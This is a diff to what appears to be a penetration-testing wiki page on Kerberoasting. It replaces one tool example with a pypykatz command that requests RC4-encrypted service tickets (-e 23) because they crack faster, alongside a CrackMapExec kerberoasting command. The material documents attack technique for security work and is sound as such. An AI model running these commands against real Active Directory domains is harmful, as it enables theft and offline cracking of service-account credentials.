@@ -36,18 +36,11 @@ This can also be achieved with [CrackMapExec](https://github.com/byt3bl33d3r/Cra
 crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --kerberoasting kerberoastables.txt --kdcHost $KeyDistributionCenter
 ```
 
-Another alternative is the [kerberoast](https://github.com/skelsec/kerberoast) pure-python toolkit.
+Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) (Python) it is possible to request an RC4 encrypted ST even when AES encryption is enabled (and if RC4 is still accepted of course). The tool features an -e flag which specifies what encryption type should be requested (default to 23, i.e. RC4). Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.
 
 ```bash
-python3 kerberoast spnroast kerberos+pass://"domain"\\"user":"password"@"target" -u "target_user" -r "realm"
+python3 pypykatz kerberos spnroast -d $DOMAIN -t $TARGET_USER -e 23 'kerberos+password://DOMAIN\username:Password@IP'
 ```
-
-Using [pypykatz](https://github.com/skelsec/pypykatz/wiki/Kerberos-spnroast-command) it is possible to request an RC4 encrypted ST even when AES encryption is enabled. Trying to crack `$krb5tgs$23` takes less time than for `krb5tgs$18`.
-
-```bash
-python3 pypykatz kerberos spnroast 'kerberos+password://DOMAIN\username:Password@IP' -d domain -t target_user
-```
-
 {% endtab %}
 
 {% tab title="Windows" %}
